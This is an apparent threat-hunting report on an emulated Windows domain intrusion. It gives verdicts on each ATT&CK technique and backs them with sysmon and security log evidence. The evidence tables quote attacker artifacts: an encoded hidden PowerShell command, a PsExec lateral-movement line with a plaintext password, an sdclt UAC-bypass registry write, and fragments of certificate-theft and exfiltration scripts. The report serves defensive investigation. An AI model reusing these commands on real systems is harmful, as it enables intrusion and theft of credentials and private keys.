| 2 | 2020-04-30 00:20:49.313Z | bobs.bigwheel.local | zeek | zeek.path | \\NEWYORK.dmevals.local\sysvol | .ds-logs-zeek-default-2026.10.22-000001 / AaFiKZc9VXKkeByNiUGh | q-3c6a37579d | ok |
| 3 | 2020-05-02 03:01:43.091Z | scranton.dmevals.local | windows.sysmon | win.TargetFilename | C:\Windows\System32\GroupPolicy\DataStore\0\sysvol\dmevals.local\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\Machine\Microsoft\Windows NT\SecEdit\GptTmpl.in… | .ds-logs-windows.sysmon-default-2026.10.22-000001 / AaFiJ5c9VXKkeBoTWpZy | q-3a2b277358 | ok |

### F68 · suspicious / low · T1552.006 · hostui.exe elevated via runas from PowerShell on scranton

Evidence status: **verified**

At 03:21:27Z PowerShell ran 'Start-Process C:\Windows\System32\hostui.exe -verb runas', producing a High-integrity hostui.exe process.

| # | Time (UTC) | Host | Dataset | Field | Stored value | Event (_index / _id) | Query | Check |
|---|---|---|---|---|---|---|---|---|
| 1 | 2020-05-02 03:21:27.276Z | scranton.dmevals.local | windows.sysmon | process.parent.command_line | powershell.exe  -c "Start-Process C:\Windows\System32\hostui.exe -verb runas" | .ds-logs-windows.sysmon-default-2026.10.22-000001 / AaFiJpc9VXKkeBi30hQJ | q-aea12eac2b | ok |

### F30 · suspicious / medium · T1555 · Rare full-access LSASS handles from PowerShell/wsmprovhost on scranton and nashua — investigated, no credential-store dumping

Evidence status: **verified**

On 2020-05-02 the only non-routine LSASS handle requests in the whole sysmon window were two PowerShell-family processes: C:\windows\system32\WindowsPowerShell\v1.0\PowerShell.exe (pid 2976) on scranton.dmevals.local opened lsass.exe with GrantedAccess 0x1f3fff at 03:05:16.623Z and 0x1fffff at 03:05:16.654Z, and C:\windows\system32\wsmprovhost.exe (pid 7720) on nashua.dmevals.local opened lsass.exe with 0x1f3fff at 03:09:29.430Z. Both are attributable to the compromised user pbeesly (DMEVALS\pbeesly, S-1-5-21-1830255721-3727074217-2423397540-1107), who was running hands-on-keyboard PowerShell on scranton from 02:56Z (payload launched from C:\ProgramData\victim\cod.3aka3.scr via explorer.exe -> cmd.exe -> powershell). The nashua handle is explained by a benign cmdlet: the only 4104 script block on nashua in that window is 'Get-Process -IncludeUserName \| Select-Object UserName,SessionId ...', which makes PowerShell query process owners and touch LSASS. The scranton handles at 03:05:16 sit between the Get-PrivateKeys certificate-export function (03:04:56) and the psversion.ps1 screen-capture/keystroke-check script (03:05:45), and no dump artifact, sekurlsa/lsadump/mimikatz/procdump/comsvcs command line, or LSASS minidump file was found anywhere. All other LSASS access in the window is baseline: svchost.exe 0x1000 (286 events), Azure IaaSAntimalware AntimalwareConfig.exe and WindowsAzureTelemetryService.exe 0x1400, wininit/csrss 0x1fffff at boot, and svchost 0x101001 via lsm.dll. So the technique family is not confirmed as executed, but the host and account are clearly compromised and the high-privilege LSASS handles remain unexplained by any legitimate tooling.

| # | Time (UTC) | Host | Dataset | Field | Stored value | Event (_index / _id) | Query | Check |
|---|---|---|---|---|---|---|---|---|
| 1 | 2020-05-02 03:05:16.654Z | scranton.dmevals.local | windows.sysmon | win.GrantedAccess | 0x1fffff | .ds-logs-windows.sysmon-default-2026.10.22-000001 / AaFiJ5c9VXKkeBoMQUXI | q-0802c5cbe5 | ok |
| 2 | 2020-05-02 03:05:16.654Z | scranton.dmevals.local | windows.sysmon | win.SourceImage | C:\windows\system32\WindowsPowerShell\v1.0\PowerShell.exe | .ds-logs-windows.sysmon-default-2026.10.22-000001 / AaFiJ5c9VXKkeBoMQUXI | q-0802c5cbe5 | ok |
| 3 | 2020-05-02 03:09:29.430Z | nashua.dmevals.local | windows.sysmon | win.SourceImage | C:\windows\system32\wsmprovhost.exe | .ds-logs-windows.sysmon-default-2026.10.22-000001 / AaFiJpc9VXKkeBn663fz | q-ebec04b7cc | ok |
| 4 | 2020-05-02 03:09:29.430Z | nashua.dmevals.local | windows.sysmon | win.GrantedAccess | 0x1f3fff | .ds-logs-windows.sysmon-default-2026.10.22-000001 / AaFiJpc9VXKkeBn663fz | q-ebec04b7cc | ok |
| 5 | 2020-05-02 03:09:28.000Z | nashua.dmevals.local | windows.powershell | win.ScriptBlockText |  Get-Process -IncludeUserName \| Select-Object UserName,SessionId \| Where-Object { $_.UserName -like "*\$env:USERNAME" } \| Sort-Object SessionId -Unique  | .ds-logs-windows.powershell-default-2026.10.22-000001 / AaFiKJc9VXKkeByCVtlI | q-92f3f6dcc7 | ok |
| 6 | 2020-05-02 03:05:16.000Z | scranton.dmevals.local | windows.security | win.AccessMask | 0x1fffff | .ds-logs-windows.security-default-2026.10.22-000001 / AaFiJ5c9VXKkeBy0A4uc | q-7ff9ae24c2 | ok |
| 7 | 2020-05-02 02:55:56.000Z | scranton.dmevals.local | windows.security | win.NewProcessName | C:\ProgramData\victim\â€®cod.3aka3.scr | .ds-logs-windows.security-default-2026.10.22-000001 / AaFiJ5c9VXKkeBy3EfF6 | q-cbfb196828 | ok |

### F67 · suspicious / low · T1556 · sdclt.exe UAC-bypass pattern preceding Add-Type compile on scranton

Evidence status: **verified**

Three sdclt.exe launches from cmd.exe at 02:58:42Z followed the HKCU Folder\shell\open\command registry writes and preceded the csc.exe compile.

| # | Time (UTC) | Host | Dataset | Field | Stored value | Event (_index / _id) | Query | Check |
|---|---|---|---|---|---|---|---|---|
| 1 | 2020-05-02 02:58:42.401Z | scranton.dmevals.local | windows.sysmon | process.command_line | C:\windows\system32\sdclt.exe | .ds-logs-windows.sysmon-default-2026.10.22-000001 / AaFiJ5c9VXKkeBosxOR1 | q-645f2dbda5 | ok |
| 2 | 2020-05-02 02:57:18.000Z | scranton.dmevals.local | windows.powershell | win.ScriptBlockText | New-Item -Path HKCU:\Software\Classes\Folder\shell -Name open -Force; | .ds-logs-windows.powershell-default-2026.10.22-000001 / AaFiKJc9VXKkeByYf10J | q-0c21f05933 | ok |

### F05 · benign / medium · T1003 · No credential-dumping tooling observed; the pbeesly intrusion on scranton/nashua targeted keys, screenshots and files instead

Evidence status: **verified**

The compromised account pbeesly ran a hands-on-keyboard PowerShell session on scranton.dmevals.local (SysinternalsSuite.zip downloaded to C:\Users\pbeesly\Downloads at 02:59:42Z, psversion.ps1 loaded, Get-PrivateKeys exporting .pfx files, Invoke-ScreenCapture, Invoke-Exfil writing C:\Users\pbeesly\AppData\Roaming\OfficeSupplies.7z, and an encoded -nop -w hidden -e command spawned from HKLM:\SOFTWARE\Javasoft at 03:21:28Z), and on nashua.dmevals.local created C:\Users\pbeesly\AppData\Roaming\working.zip and C:\Users\pbeesly\Desktop\working.zip via C:\Windows\Temp\Rar.exe. None of these command lines, script blocks or file artifacts reference LSASS dumping, SAM/SECURITY hive export, NTDS, LSA secrets or DCSync; the credential-access techniques in this family are therefore not observed, though the host compromise itself is real.

| # | Time (UTC) | Host | Dataset | Field | Stored value | Event (_index / _id) | Query | Check |
|---|---|---|---|---|---|---|---|---|
| 1 | 2020-05-02 02:59:42.544Z | scranton.dmevals.local | windows.sysmon | win.TargetFilename | C:\Users\pbeesly\Downloads\SysinternalsSuite.zip | .ds-logs-windows.sysmon-default-2026.10.22-000001 / AaFiJ5c9VXKkeBoglALi | q-0f911b40f2 | ok |
| 2 | 2020-05-02 03:08:02.000Z | scranton.dmevals.local | windows.powershell | win.ScriptBlockText | function Invoke-Exfil {      if (!(Get-Module -Name "7Zip4Powershell")) { Write-Host "[*] Installing 7Zip4Powershell module"; Install-Module -Name 7Zip4Powershe… | .ds-logs-windows.powershell-default-2026.10.22-000001 / AaFiKJc9VXKkeByPYrDh | q-a4a0f1689c | ok |
| 3 | 2020-05-02 03:04:56.000Z | scranton.dmevals.local | windows.powershell | win.ScriptBlockText | function Get-PrivateKeys {     $mypwd = ConvertTo-SecureString -String "saribas" -Force -AsPlainText     $CertPaths = Get-ChildItem -Path cert:\LocalMachine -Re… | .ds-logs-windows.powershell-default-2026.10.22-000001 / AaFiKJc9VXKkeByRaLqc | q-a2daf30fcc | ok |
| 4 | 2020-05-02 03:21:28.949Z | scranton.dmevals.local | windows.sysmon | process.command_line | "C:\windows\System32\WindowsPowerShell\v1.0\powershell.exe" -nop -w hidden -e aQBmACgAWwBJAG4AdABQAHQAcgBdADoAOgBTAGkAegBlACAALQBlAHEAIAA0ACkAewAkAGIAPQAkAGUAbg… | .ds-logs-windows.sysmon-default-2026.10.22-000001 / AaFiJpc9VXKkeBjA9g2o | q-0acd12cb58 | ok |
| 5 | 2020-05-02 03:16:19.462Z | nashua.dmevals.local | windows.sysmon | win.TargetFilename | C:\Users\pbeesly\Desktop\working.zip | .ds-logs-windows.sysmon-default-2026.10.22-000001 / AaFiJpc9VXKkeBnxyHFB | q-0f911b40f2 | ok |

### F01 · benign / high · T1003.001 · LSASS handle opens with full-access masks by PowerShell/wsmprovhost are process enumeration, not memory dumping

Evidence status: **verified**

On scranton.dmevals.local, PowerShell.exe (PID 2976) opened lsass.exe (PID 736) with GrantedAccess 0x1F3FFF at 03:05:16.623Z and 0x1FFFFF at 03:05:16.654Z; the call trace ends in ntdll/KERNELBASE plus an UNKNOWN module, and no dump file was written. On nashua.dmevals.local, wsmprovhost.exe (PID 7720) opened lsass.exe (PID 728) with 0x1F3FFF at 03:09:29.430Z; its call trace runs through System.ni.dll and Microsoft.PowerShell.Commands.Management.ni.dll, and the matching 4104 script block (ScriptBlockId 0ed655f2-b377-4188-aeb7-ae2e4789eb7e, ExecutionProcessID 7720) is 'Get-Process -IncludeUserName \| Select-Object UserName,SessionId ...'. The scranton 03:01:03.622Z PowerShell (PID 3876) LSASS open with 0x1000 matches the 4104 script block 'get-process' (ScriptBlockId 66a7f650-8a84-4dcf-a0f7-41d06de51f5c, ExecutionProcessID 3876). The remaining 0x1FFFFF/0x1000000 opens at 03:19:09.803Z are wininit.exe/csrss.exe against the newly started lsass.exe (PID 748) during a boot, and 0x101001/0x3000 opens are svchost.exe. No MiniDump/comsvcs/procdump command line, no lsass.dmp, and no 4104 block referencing lsass/MiniDump/Invoke-Mimikatz were found. The only .dmp files are WerFault.exe WER crash dumps for SkypeApp.

| # | Time (UTC) | Host | Dataset | Field | Stored value | Event (_index / _id) | Query | Check |
|---|---|---|---|---|---|---|---|---|
| 1 | 2020-05-02 03:05:16.654Z | scranton.dmevals.local | windows.sysmon | win.GrantedAccess | 0x1fffff | .ds-logs-windows.sysmon-default-2026.10.22-000001 / AaFiJ5c9VXKkeBoMQUXI | q-221db1973c | ok |
| 2 | 2020-05-02 03:05:16.654Z | scranton.dmevals.local | windows.sysmon | win.SourceImage | C:\windows\system32\WindowsPowerShell\v1.0\PowerShell.exe | .ds-logs-windows.sysmon-default-2026.10.22-000001 / AaFiJ5c9VXKkeBoMQUXI | q-221db1973c | ok |
| 3 | 2020-05-02 03:09:29.430Z | nashua.dmevals.local | windows.sysmon | win.GrantedAccess | 0x1f3fff | .ds-logs-windows.sysmon-default-2026.10.22-000001 / AaFiJpc9VXKkeBn663fz | q-f4c91f1866 | ok |
| 4 | 2020-05-02 03:09:29.430Z | nashua.dmevals.local | windows.sysmon | win.SourceImage | C:\windows\system32\wsmprovhost.exe | .ds-logs-windows.sysmon-default-2026.10.22-000001 / AaFiJpc9VXKkeBn663fz | q-f4c91f1866 | ok |
| 5 | 2020-05-02 03:09:28.000Z | nashua.dmevals.local | windows.powershell | win.ScriptBlockText |  Get-Process -IncludeUserName \| Select-Object UserName,SessionId \| Where-Object { $_.UserName -like "*\$env:USERNAME" } \| Sort-Object SessionId -Unique  | .ds-logs-windows.powershell-default-2026.10.22-000001 / AaFiKJc9VXKkeByCVtlI | q-1b089cc4d1 | ok |
| 6 | 2020-05-02 03:01:03.000Z | scranton.dmevals.local | windows.powershell | win.ScriptBlockText | get-process | .ds-logs-windows.powershell-default-2026.10.22-000001 / AaFiKJc9VXKkeByUbwus | q-d72386d7f2 | ok |
| 7 | 2020-05-02 03:05:27.395Z | nashua.dmevals.local | windows.sysmon | win.TargetFilename | C:\ProgramData\Microsoft\Windows\WER\Temp\WER51F5.tmp.dmp | .ds-logs-windows.sysmon-default-2026.10.22-000001 / AaFiJ5c9VXKkeBoLO1t- | q-cc0bc72605 | ok |

### F02 · benign / high · T1003.002 · SAM_DOMAIN/SAM_SERVER handle requests are made by lsass.exe itself under SYSTEM

Evidence status: **verified**

All 21 SAM_ALIAS/SAM_SERVER/SAM_DOMAIN handle events (4656) in windows.security come from process.executable C:\Windows\System32\lsass.exe running as SCRANTON$ (S-1-5-18, logon 0x3E7) on scranton.dmevals.local between 03:19:11Z and 03:20:46Z. The SAM_DOMAIN 'SCRANTON' request carries AccessMask 0xF07DF with accesses such as ReadPasswordParameters/ListAccounts, which is the LSA's own internal SAM access, not an external tool. No reg save, no SAM/SECURITY/SYSTEM hive file copies (the only file.path matches for SAM/SECURITY/SYSTEM are Prefetch .pf files), and no 4688/1 command line containing 'reg save' or 'SAM' were found.

| # | Time (UTC) | Host | Dataset | Field | Stored value | Event (_index / _id) | Query | Check |
|---|---|---|---|---|---|---|---|---|
| 1 | 2020-05-02 03:19:21.000Z | scranton.dmevals.local | windows.security | win.ObjectType | SAM_DOMAIN | .ds-logs-windows.security-default-2026.10.22-000001 / AaFiJ5c9VXKkeBuWmZPb | q-6a8e3e5fe4 | ok |
| 2 | 2020-05-02 03:19:21.000Z | scranton.dmevals.local | windows.security | win.ProcessName | C:\Windows\System32\lsass.exe | .ds-logs-windows.security-default-2026.10.22-000001 / AaFiJ5c9VXKkeBuWmZPb | q-6a8e3e5fe4 | ok |
| 3 | 2020-05-02 03:19:21.000Z | scranton.dmevals.local | windows.security | win.AccessMask | 0xf07df | .ds-logs-windows.security-default-2026.10.22-000001 / AaFiJ5c9VXKkeBuWmZPb | q-6a8e3e5fe4 | ok |
| 4 | 2020-05-02 03:19:11.000Z | scranton.dmevals.local | windows.security | win.ObjectType | SAM_ALIAS | .ds-logs-windows.security-default-2026.10.22-000001 / AaFiJ5c9VXKkeBuv695R | q-c765642fd9 | ok |
| 5 | 2020-05-02 03:21:28.476Z | scranton.dmevals.local | windows.sysmon | win.TargetFilename | C:\Windows\Prefetch\SECURITYHEALTHSYSTRAY.EXE-41AD6DE1.pf | .ds-logs-windows.sysmon-default-2026.10.22-000001 / AaFiJpc9VXKkeBizx7sV | q-fe1c511f75 | ok |

### F03 · benign / high · T1003.005 · HKLM\SECURITY\Cache\NL$1 writes are lsass.exe maintaining cached credentials

Evidence status: **verified**

The registry writes to HKLM\SECURITY\Cache\NL$1 on nashua.dmevals.local (03:11:40Z, 03:12:46Z, 03:13:49Z, 03:15:03Z) are performed by process.executable C:\windows\system32\lsass.exe (PID 728) with Details 'Binary Data' — the LSA updating its own cached-domain-credential slot, not an external reader. No 4656/4663/4670 events referencing Cache or SECURITY objects, and no 4104 script block mentioning cache/DCC2/mscache, were returned.

| # | Time (UTC) | Host | Dataset | Field | Stored value | Event (_index / _id) | Query | Check |
|---|---|---|---|---|---|---|---|---|
| 1 | 2020-05-02 03:11:40.144Z | nashua.dmevals.local | windows.sysmon | win.TargetObject | HKLM\SECURITY\Cache\NL$1 | .ds-logs-windows.sysmon-default-2026.10.22-000001 / AaFiJ5c9VXKkeBox14nu | q-4032433617 | ok |
| 2 | 2020-05-02 03:11:40.144Z | nashua.dmevals.local | windows.sysmon | process.executable | C:\windows\system32\lsass.exe | .ds-logs-windows.sysmon-default-2026.10.22-000001 / AaFiJ5c9VXKkeBox14nu | q-4032433617 | ok |

### F04 · benign / medium · T1003.006 · Directory-replication GUID access on newyork is a single non-DCSync event

Evidence status: **verified**

One 4662 event on newyork.dmevals.local at 03:16:15Z by NEWYORK$ lists Properties containing the DS-Replication-Get-Changes GUID {1131f6aa-9c07-11d1-f79f-00c04fc2dcd2} and {19195a5b-6da0-11d0-afd3-00c04fd930c9}. It is a single event from the machine account, not the repeated DS-Replication-Get-Changes/Get-Changes-All pattern of a DCSync, and no drsuapi/lsadump/dcsync command line or 4104 script block was found. The other 4662 events are LOCAL SERVICE with Properties '-'.

| # | Time (UTC) | Host | Dataset | Field | Stored value | Event (_index / _id) | Query | Check |
|---|---|---|---|---|---|---|---|---|
| 1 | 2020-05-02 03:16:15.000Z | newyork.dmevals.local | windows.security | win.Properties | %%7688  		{1131f6aa-9c07-11d1-f79f-00c04fc2dcd2}  	{19195a5b-6da0-11d0-afd3-00c04fd930c9}   | .ds-logs-windows.security-default-2026.10.22-000001 / AaFiJ5c9VXKkeBumw-cX | q-b56cabc5da | ok |
| 2 | 2020-05-02 03:16:15.000Z | newyork.dmevals.local | windows.security | user.name | NEWYORK$ | .ds-logs-windows.security-default-2026.10.22-000001 / AaFiJ5c9VXKkeBumw-cX | q-b56cabc5da | ok |

### F06 · benign / high · T1040 · Azure Network Watcher agent performs legitimate netsh packet capture on scranton (benign platform telemetry)

Evidence status: **verified**

On scranton.dmevals.local, the Azure guest-agent plugin NetworkWatcherAgent.exe (signed 'Microsoft CoreXT', description 'Networking-NetAnalytics release_14_nwa') was started by services.exe and by WindowsAzureGuestAgent.exe via enable.cmd, and it invoked netsh.exe 'trace start capture=yes traceFile=C:\windows\TEMP\...etl' followed by 'netsh trace stop'. The same window shows the Microsoft NDIS Capture service start type being flipped from demand start to system start and back, and logman.exe ETL tracing driven by WaAppAgent.exe. This is genuine packet capture, but it is the standard Azure Network Watcher / diagnostics stack running as SYSTEM from the vendor package path, not adversary sniffing.

| # | Time (UTC) | Host | Dataset | Field | Stored value | Event (_index / _id) | Query | Check |
|---|---|---|---|---|---|---|---|---|
| 1 | 2020-05-02 03:19:17.154Z | scranton.dmevals.local | windows.sysmon | process.command_line | C:\windows\system32\netsh.exe trace start capture=yes traceFile="C:\windows\TEMP\E7116ECA-DFE6-43C7-8FA8-8D3AC5AA8726\B91E06C5-1C7C-4830-9A76-74FA211560A7.etl" | .ds-logs-windows.sysmon-default-2026.10.22-000001 / AaFiJpc9VXKkeBnvvDAD | q-3884d8228a | ok |
| 2 | 2020-05-02 03:19:17.154Z | scranton.dmevals.local | windows.sysmon | process.parent.executable | C:\Packages\Plugins\Microsoft.Azure.NetworkWatcher.NetworkWatcherAgentWindows\1.4.1421.1\NetworkWatcherAgent\NetworkWatcherAgent.exe | .ds-logs-windows.sysmon-default-2026.10.22-000001 / AaFiJpc9VXKkeBnvvDAD | q-3884d8228a | ok |
| 3 | 2020-05-02 03:19:13.877Z | scranton.dmevals.local | windows.sysmon | win.Company | Microsoft CoreXT | .ds-logs-windows.sysmon-default-2026.10.22-000001 / AaFiJpc9VXKkeBnaXZbG | q-be5845acd0 | ok |
| 4 | 2020-05-02 03:19:24.835Z | scranton.dmevals.local | windows.sysmon | process.command_line | C:\windows\system32\netsh.exe trace stop | .ds-logs-windows.sysmon-default-2026.10.22-000001 / AaFiJpc9VXKkeBnkjXIW | q-3884d8228a | ok |
| 5 | 2020-05-02 03:19:22.000Z | scranton.dmevals.local | windows.other | message | The start type of the Microsoft NDIS Capture service was changed from demand start to system start. | .ds-logs-windows.other-default-2026.10.22-000001 / AaFiKJc9VXKkeBwdMB1J | q-03ed46b14a | ok |
| 6 | 2020-05-02 03:19:41.076Z | scranton.dmevals.local | windows.sysmon | process.command_line | "logman.exe" create trace RTEvents -max 50 -f bincirc -o C:\WindowsAzure\Logs\RuntimeEvents.etl -pf C:\WindowsAzure\Packages\GuestAgent\ProviderGuids.txt | .ds-logs-windows.sysmon-default-2026.10.22-000001 / AaFiJpc9VXKkeBnFCvgF | q-be5845acd0 | ok |

### F07 · benign / medium · T1040 · No adversary network-sniffing tooling, capture driver or promiscuous-mode activity found

Evidence status: **verified**

Hunting for T1040 across the Windows telemetry produced no attacker sniffing evidence. Process-creation stacks on all four hosts (windows.security 4688 and windows.sysmon event 1) contain no tcpdump/windump/wireshark/rawcap/pktmon, and the dedicated checks for pcap/sniff/promisc command lines, pcap/npcap/winpcap image loads (sysmon event 6) and PowerShell script blocks mentioning pcap/sniff/promiscuous all returned zero hits. The only capture-capable activity is the signed Azure Network Watcher/netsh trace stack on scranton (reported separately as benign). The suspicious python.exe on nashua is not a sniffer: all 348 of its network connections go to a single destination 192.168.0.4:8443, i.e. outbound C2-style traffic rather than promiscuous capture of other hosts' traffic. Zeek (2020-04-30) does not overlap the Windows window and shows no ICMP conn records, so it cannot corroborate or refute sniffing.

| # | Time (UTC) | Host | Dataset | Field | Stored value | Event (_index / _id) | Query | Check |
|---|---|---|---|---|---|---|---|---|
| 1 | 2020-05-02 03:15:04.235Z | nashua.dmevals.local | windows.sysmon | process.executable | C:\Windows\Temp\python.exe | .ds-logs-windows.sysmon-default-2026.10.22-000001 / AaFiJ5c9VXKkeBoy3l7- | q-b78933c5fd | ok |
| 2 | 2020-05-02 03:15:04.235Z | nashua.dmevals.local | windows.sysmon | process.parent.executable | C:\Windows\Temp\python.exe | .ds-logs-windows.sysmon-default-2026.10.22-000001 / AaFiJ5c9VXKkeBoy3l7- | q-b78933c5fd | ok |
| 3 | 2020-05-02 03:15:05.142Z | nashua.dmevals.local | windows.sysmon | destination.ip | 192.168.0.4 | .ds-logs-windows.sysmon-default-2026.10.22-000001 / AaFiJpc9VXKkeBnyzTy7 | q-d4a43664e4 | ok |
| 4 | 2020-05-02 03:15:05.142Z | nashua.dmevals.local | windows.sysmon | destination.port | 8443 | .ds-logs-windows.sysmon-default-2026.10.22-000001 / AaFiJpc9VXKkeBnyzTy7 | q-d4a43664e4 | ok |
| 5 | 2020-05-02 03:11:18.000Z | scranton.dmevals.local | windows.security | process.command_line | "C:\Program Files\SysinternalsSuite\PsExec64.exe" -accepteula \\NASHUA -u dmevals\pbeesly -p Fl0nk3rt0n!T0by -i 2 C:\Windows\Temp\python.exe | .ds-logs-windows.security-default-2026.10.22-000001 / AaFiJ5c9VXKkeBuu5GRt | q-fd356dc0f1 | ok |

### F10 · benign / medium · T1056.001 · No keylogger indicators found (no GetAsyncKeyState/SetWindowsHookEx, no hook DLLs)

Evidence status: **verified**

Searches for keylogging artefacts returned nothing: no process command line or PowerShell script block containing keylog/GetAsyncKeyState/SetWindowsHookEx, and no hook/MiniDump script content. The 470 process-access events to lsass/winlogon/explorer are dominated by svchost.exe with GrantedAccess 0x1000 (PROCESS_QUERY_LIMITED_INFORMATION) and by the PowerShell session's token enumeration; none show the low-level keyboard hook or keystroke-polling pattern of a keylogger. The screen-capture loop on scranton is GUI capture (T1056.002), not keystroke logging.

| # | Time (UTC) | Host | Dataset | Field | Stored value | Event (_index / _id) | Query | Check |
|---|---|---|---|---|---|---|---|---|
| 1 | 2020-05-02 03:01:04.106Z | scranton.dmevals.local | windows.sysmon | win.GrantedAccess | 0x1000 | .ds-logs-windows.sysmon-default-2026.10.22-000001 / AaFiJ5c9VXKkeBoWbcdc | q-b1d40d1587 | ok |
| 2 | 2020-05-02 03:01:04.106Z | scranton.dmevals.local | windows.sysmon | win.TargetImage | C:\windows\system32\winlogon.exe | .ds-logs-windows.sysmon-default-2026.10.22-000001 / AaFiJ5c9VXKkeBoWbcdc | q-b1d40d1587 | ok |

### F11 · benign / medium · T1056.003 · No web portal capture observed

Evidence status: **verified**

No evidence of web portal credential capture: no file writes to wwwroot/inetpub/login paths, no w3wp/iis process command lines, no 4663 access to wwwroot/inetpub/login objects, and no PowerShell script blocks referencing wwwroot/login. The zeek dataset (2020-04-30) does not overlap the Windows windows (2020-05-02) and contained no HTTP POSTs, so web-based capture could not be corroborated there either.

| # | Time (UTC) | Host | Dataset | Field | Stored value | Event (_index / _id) | Query | Check |
|---|---|---|---|---|---|---|---|---|
| 1 | 2020-05-02 03:05:16.623Z | scranton.dmevals.local | windows.sysmon | host.name | scranton.dmevals.local | .ds-logs-windows.sysmon-default-2026.10.22-000001 / AaFiJ5c9VXKkeBoMQUXF | q-765d210fc9 | ok |

### F13 · benign / high · T1110 · No brute-force authentication activity; only a single successful credential validation (4776, error 0x0)

Evidence status: **verified**

Across windows.security (2020-05-02T02:55:25Z..03:28:09Z) there are zero 4625 failed-logon events, zero 4771/4740 events, and exactly one 4776 credential-validation event: on newyork.dmevals.local at 2020-05-01T23:20:40-04:00 for account pbeesly from workstation 10.0.1.4 with Error Code 0x0 (success). The 297 4624 logons are dominated by machine accounts (NEWYORK$ 123, SCRANTON$ 37, NASHUA$ 25, WEC$ 8, UTICA$ 5) and SYSTEM logon type 5, i.e. normal service/network logons. No authentication-failure or lockout pattern exists in the window, so no brute-force behaviour is observable.

| # | Time (UTC) | Host | Dataset | Field | Stored value | Event (_index / _id) | Query | Check |
|---|---|---|---|---|---|---|---|---|
| 1 | 2020-05-02 03:20:40.000Z | newyork.dmevals.local | windows.security | message | The computer attempted to validate the credentials for an account.    Authentication Package:	MICROSOFT_AUTHENTICATION_PACKAGE_V1_0  Logon Account:	pbeesly  Sou… | .ds-logs-windows.security-default-2026.10.22-000001 / AaFiJ5c9VXKkeBuTlU_q | q-ce78fca16f | ok |
| 2 | 2020-05-02 03:20:40.000Z | newyork.dmevals.local | windows.security | event.code | 4776 | .ds-logs-windows.security-default-2026.10.22-000001 / AaFiJ5c9VXKkeBuTlU_q | q-ce78fca16f | ok |

### F14 · benign / high · T1110.001 · No password-guessing pattern: no 4625 failures and no password-bearing command lines

Evidence status: **verified**

The 4625-based checks (C105/C106/C107) returned zero hits, and the sysmon check for process command lines containing 'password' (C110) returned zero hits. The only 'failed' strings in windows.other were unrelated system messages (crash dump initialization failure, PTR registration failure on scranton). Nothing in the data shows repeated authentication attempts against accounts.

| # | Time (UTC) | Host | Dataset | Field | Stored value | Event (_index / _id) | Query | Check |
|---|---|---|---|---|---|---|---|---|
| 1 | 2020-05-02 03:18:54.000Z | scranton.dmevals.local | windows.other | message | Crash dump initialization failed! | .ds-logs-windows.other-default-2026.10.22-000001 / AaFiKJc9VXKkeBwdMB0P | q-e3321ef314 | ok |
| 2 | 2020-05-02 03:19:20.000Z | scranton.dmevals.local | windows.other | event.code | 8013 | .ds-logs-windows.other-default-2026.10.22-000001 / AaFiKJc9VXKkeBwdLx28 | q-e3321ef314 | ok |

### F15 · benign / medium · T1110.002 · No offline cracking artefacts; LSASS/SAM access is legitimate system activity, but certificate private keys were exported on scranton

Evidence status: **verified**

The 326 sysmon event-10 accesses to C:\windows\system32\lsass.exe are dominated by svchost.exe (289, GrantedAccess 0x1000) plus Azure antimalware/telemetry binaries (AntimalwareConfig.exe 15, WindowsAzureTelemetryService.exe 13) and wininit/csrss/services — normal. The 10 'SAM' object events are 4656 handle requests by C:\Windows\System32\lsass.exe itself (AccessMask 0xf003f) on scranton, not by an attacker tool. No wordlist/potfile creation, no hash/crack command lines, and no ConvertTo-SecureString/hash script blocks were found. Separately (not cracking, but credential theft) the pbeesly PowerShell session on scranton defined Get-PrivateKeys, which exports every LocalMachine certificate to a random .pfx in Downloads protected by the hardcoded password 'saribas' — this is certificate/key theft rather than password cracking, and is reported under the T1110 family only as context.

| # | Time (UTC) | Host | Dataset | Field | Stored value | Event (_index / _id) | Query | Check |
|---|---|---|---|---|---|---|---|---|
| 1 | 2020-05-02 03:20:46.000Z | scranton.dmevals.local | windows.security | win.ProcessName | C:\Windows\System32\lsass.exe | .ds-logs-windows.security-default-2026.10.22-000001 / AaFiJ5c9VXKkeBuiuXgG | q-47baf20d9e | ok |
| 2 | 2020-05-02 03:20:46.000Z | scranton.dmevals.local | windows.security | win.ObjectName | SAM | .ds-logs-windows.security-default-2026.10.22-000001 / AaFiJ5c9VXKkeBuiuXgG | q-47baf20d9e | ok |
| 3 | 2020-05-02 03:04:56.000Z | scranton.dmevals.local | windows.powershell | win.ScriptBlockText | function Get-PrivateKeys {     $mypwd = ConvertTo-SecureString -String "saribas" -Force -AsPlainText     $CertPaths = Get-ChildItem -Path cert:\LocalMachine -Re… | .ds-logs-windows.powershell-default-2026.10.22-000001 / AaFiKJc9VXKkeByRaLqc | q-4c4ba3127d | ok |
| 4 | 2020-05-02 03:04:56.000Z | scranton.dmevals.local | windows.powershell | win.Path | C:\Program Files\SysinternalsSuite\readme.ps1 | .ds-logs-windows.powershell-default-2026.10.22-000001 / AaFiKJc9VXKkeByRaLqc | q-4c4ba3127d | ok |

### F16 · benign / high · T1110.003 · No password spraying: no 4625 burst, no user-list tooling; 4648 events are PsExec/RDP use of pbeesly's own credentials

Evidence status: **verified**

All 4625-based spray checks (C118/C119/C121) returned zero hits, and the only command line containing 'user' was C:\windows\system32\userinit.exe. The 15 event-4648 explicit-credential logons show pbeesly re-using its own credentials: on scranton from 10.0.1.6 (svchost.exe, 23:11-23:14) and on nashua via C:\Windows\PSEXESVC.exe (23:11:40, 23:12:46, 23:13:49, 23:15:03), plus routine DWM-1/UMFD-*/SCRANTON$ winlogon/taskhostw entries. This is lateral movement with already-known credentials (PsExec service installs on nashua), not spraying of many accounts with few passwords.

| # | Time (UTC) | Host | Dataset | Field | Stored value | Event (_index / _id) | Query | Check |
|---|---|---|---|---|---|---|---|---|
| 1 | 2020-05-02 03:11:40.000Z | nashua.dmevals.local | windows.security | process.executable | C:\Windows\PSEXESVC.exe | .ds-logs-windows.security-default-2026.10.22-000001 / AaFiJ5c9VXKkeBuu5GRH | q-e93aa4dc0a | ok |
| 2 | 2020-05-02 03:11:39.000Z | nashua.dmevals.local | windows.other | message | A service was installed in the system.    Service Name:  PSEXESVC  Service File Name:  %SystemRoot%\PSEXESVC.exe  Service Type:  user mode service  Service Star… | .ds-logs-windows.other-default-2026.10.22-000001 / AaFiKJc9VXKkeBwdMB0i | q-35c560b269 | ok |

### F17 · benign / high · T1110.004 · No credential stuffing: no failed-logon volume and no credential-list tooling

Evidence status: **verified**

